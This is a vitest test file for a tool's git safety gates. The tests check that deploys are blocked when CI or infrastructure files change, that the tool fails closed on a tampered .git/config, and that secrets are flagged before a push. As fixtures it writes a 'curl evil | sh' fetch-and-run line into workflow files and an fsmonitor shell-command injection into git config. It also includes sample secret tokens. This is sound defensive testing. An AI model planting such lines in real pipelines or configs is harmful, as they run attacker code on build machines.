import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { execFileSync } from 'node:child_process';
import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { checkDeployAllowed, getLocalBranchStats, scanChangesetBeforePush } from '../src/git-gates.js';

let ws: string;

function g(args: string[]): string {
  return execFileSync('git', args, {
    cwd: ws,
    encoding: 'utf8',
    env: {
      PATH: process.env.PATH ?? '/usr/bin:/bin',
      HOME: ws,
      GIT_CONFIG_NOSYSTEM: '1',
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_AUTHOR_NAME: 'f',
      GIT_AUTHOR_EMAIL: 'f@x.y',
      GIT_COMMITTER_NAME: 'f',
      GIT_COMMITTER_EMAIL: 'f@x.y',
    },
  });
}

async function commitFile(rel: string, body: string) {
  await fs.mkdir(path.dirname(path.join(ws, rel)), { recursive: true });
  await fs.writeFile(path.join(ws, rel), body);
  g(['add', '-A']);
  g(['commit', '-q', '-m', `add ${rel}`]);
}

beforeEach(async () => {
  ws = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'mc-gates-')));
  g(['init', '-q', '-b', 'main']);
  await commitFile('README.md', 'hi\n');
  g(['update-ref', 'refs/remotes/origin/main', 'HEAD']);
  g(['checkout', '-q', '-b', 'mergecrew/run-1']);
});

afterEach(async () => {
  await fs.rm(ws, { recursive: true, force: true });
});

describe('checkDeployAllowed', () => {
  it('allows an ordinary source change on the run branch', async () => {
    await commitFile('src/a.ts', 'export const a = 1;\n');
    expect(await checkDeployAllowed({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main' })).toEqual({ ok: true });
  });

  it.each([
    '.github/workflows/deploy.yml',
    '.github/actions/setup/action.yml',
    'Dockerfile',
    'infra/docker/Dockerfile.runner',
    '.gitlab-ci.yml',
    'infra/main.tf',
  ])('blocks auto-deploy when the changeset touches %s', async (rel) => {
    await commitFile('src/a.ts', 'x\n');
    await commitFile(rel, 'run: curl evil | sh\n');
    const r = await checkDeployAllowed({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main' });
    expect(r).toMatchObject({ ok: false, reason: 'sensitive_paths', paths: [rel] });
  });

  it('refuses to deploy from the base branch or a non-mergecrew branch', async () => {
    expect(await checkDeployAllowed({ workspacePath: ws, branch: 'main', baseBranch: 'main' })).toMatchObject({ ok: false, reason: 'not_run_branch' });
    expect(await checkDeployAllowed({ workspacePath: ws, branch: 'feature/x', baseBranch: 'main' })).toMatchObject({ ok: false, reason: 'not_run_branch' });
  });

  it('fails closed when the diff cannot be computed', async () => {
    g(['update-ref', '-d', 'refs/remotes/origin/main']);
    const r = await checkDeployAllowed({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main' });
    expect(r).toMatchObject({ ok: false, reason: 'diff_unavailable' });
    // Blast-radius stats stay best-effort.
    expect(await getLocalBranchStats(ws, 'mergecrew/run-1', 'main')).toEqual([]);
  });

  it('fails closed on a tampered .git/config', async () => {
    await commitFile('src/a.ts', 'x\n');
    await fs.appendFile(path.join(ws, '.git/config'), '\n[core]\n\tfsmonitor = /bin/sh -c id\n');
    const r = await checkDeployAllowed({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main' });
    expect(r).toMatchObject({ ok: false, reason: 'diff_unavailable' });
  });
});

describe('scanChangesetBeforePush', () => {
  it('passes a clean changeset', async () => {
    await commitFile('src/a.ts', 'export const a = 1;\n');
    expect(
      await scanChangesetBeforePush({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main', title: 'feat: a', body: 'adds a' }),
    ).toEqual([]);
  });

  it('flags secrets in the PR body, title, and in added diff lines', async () => {
    await commitFile('src/leak.ts', 'const t = "ghs_16C7e42F292c6912E7710c838347Ae178B4a";\n');
    const f = await scanChangesetBeforePush({
      workspacePath: ws,
      branch: 'mergecrew/run-1',
      baseBranch: 'main',
      title: 'AKIAIOSFODNN7EXAMPLE',
      body: '-----BEGIN RSA PRIVATE KEY-----',
    });
    const locs = f.map((x) => x.location);
    expect(locs).toContain('diff');
    expect(locs).toContain('pr.title');
    expect(locs).toContain('pr.body');
  });

  it('flags the runner\'s own secret env values in the diff', async () => {
    const prev = process.env.KMS_MASTER_KEY;
    process.env.KMS_MASTER_KEY = 'kms-Value-For-Test-0123456789';
    try {
      await commitFile('notes.md', `key: ${process.env.KMS_MASTER_KEY}\n`);
      const f = await scanChangesetBeforePush({ workspacePath: ws, branch: 'mergecrew/run-1', baseBranch: 'main', title: 't', body: 'b' });
      expect(f).toEqual([{ kind: 'known_secret_value', location: 'diff' }]);
    } finally {
      if (prev === undefined) delete process.env.KMS_MASTER_KEY;
      else process.env.KMS_MASTER_KEY = prev;
    }
  });
});
